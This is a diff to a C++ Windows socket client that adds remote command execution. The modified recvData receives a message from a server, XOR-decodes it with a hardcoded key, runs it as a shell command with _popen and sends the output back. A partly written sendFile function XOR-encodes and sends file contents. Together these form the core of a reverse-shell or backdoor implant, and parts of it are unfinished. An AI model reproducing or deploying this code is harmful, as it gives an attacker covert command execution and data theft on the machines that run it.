@@ -25,9 +25,10 @@ public:
 	~Socks();
 	void resolve(addrinfo **info);
 	int createclientsocket(addrinfo *info);
-	int sendData();
+	int sendData(std::string msg);
 	int recvData();
 	void endclient();
+	int sendFile();
 };
 
 //Constructor
@@ -105,19 +106,82 @@ int Socks::createclientsocket(addrinfo *info) {
 	return 0;
 }
 
-//recieve data
-int Socks::sendData() {
+//send data
+int Socks::sendData(std::string msg) {
+	int result = 0;
+	std::string peaky = "enCRAPtion";
+	int peaky_len = peaky.length();
+
+	if (msg == "") {
+		std::cout << "Enter Command: ";
+		std::cin >> msg;
+	}
+	int msg_len = msg.length();
+	
+	//encryption
+	/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
+		if (x >= peaky_len) {
+			x = 0;
+		}
+		msg[i] = msg[i] ^ peaky[x];
+	}*/
+	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
+	if (result == SOCKET_ERROR) {
+		printf("send failed: %d\n", WSAGetLastError());
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return 7;
+	}
+	
 	return 0;
 }
 
-//send data
+//recieve data
 int Socks::recvData() {
 	int result = 0;
 	char recvbuf[512];
+	std::string msg = "";
+	std::string peaky = "enCRAPtion";
+	int peaky_len = peaky.length();
 
 	result = recv(ConnectSocket, recvbuf, 512, 0);
-	if (result > 0)
-		std::cout << recvbuf << std::endl;
+
+	if (result > 0) {
+		//parse actual data from message
+		for (int i = 0; i < 512; i++) {
+			if (recvbuf[i] > 0)
+				msg = msg + recvbuf[i];
+		}
+
+		int msg_len = msg.length();
+		//unencrypt
+		for (int i = 0, x = 0; i < msg_len; i++, x++) {
+			if (x >= peaky_len) {
+				x = 0;
+			}
+			msg[i] = msg[i] ^ peaky[x];
+		}
+		printf("Unencrypted message: %s\n", msg.c_str());
+		//need to pipe output into char array
+		//take address from captured response
+		char buffer[4000];
+		std::string data = "";
+		FILE* _pipe = _popen(msg.c_str(), "r");
+
+		//redirects stdout to pipe and adds elements of buffer to result string
+		if (!_pipe) {
+			std::cout << "ERROR" << std::endl;
+		}
+
+		while (!feof(_pipe)) {
+			//place characters in buffer into string
+			if (fgets(buffer, 4000, _pipe) != NULL)
+				data += buffer;
+		}
+		_pclose(_pipe);
+		
+		sendData(data);
+	}
 	else if (result == 0)
 		printf("Connection closed\n");
 	else
@@ -126,11 +190,38 @@ int Socks::recvData() {
 	return 0;
 }
 
+//sends file
+int Socks::sendFile() {
+	int result = 0;
+	std::string msg;
+	std::string peaky = "enCRAPtion";
+	int peaky_len = peaky.length();
+	//read file
+
+	int msg_len = msg.length();
+
+	for (int i = 0, x = 0; i < msg_len; i++, x++) {
+		if (x >= peaky_len) {
+			x = 0;
+		}
+		msg[i] = msg[i] ^ peaky[x];
+	}
+	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
+	if (result == SOCKET_ERROR) {
+		printf("send failed: %d\n", WSAGetLastError());
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return 7;
+	}
+	return 0;
+}
+
 //close socket
 void Socks::endclient() {
 	closesocket(ConnectSocket);
 	WSACleanup();
 }
+
 
 int main()
 {
@@ -146,10 +237,14 @@ int main()
 	}
 	freeaddrinfo(info);
 	socket.recvData();
+	std::string nullstr;
+	//socket.sendData(nullstr);
+
+	int temp = 0;
+	std::cin >> temp;
 	/*for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
 	std::cout << "family: " << ptr->ai_family << std::endl;
 	}*/
 	socket.endclient();
 	return 0;
 }
-
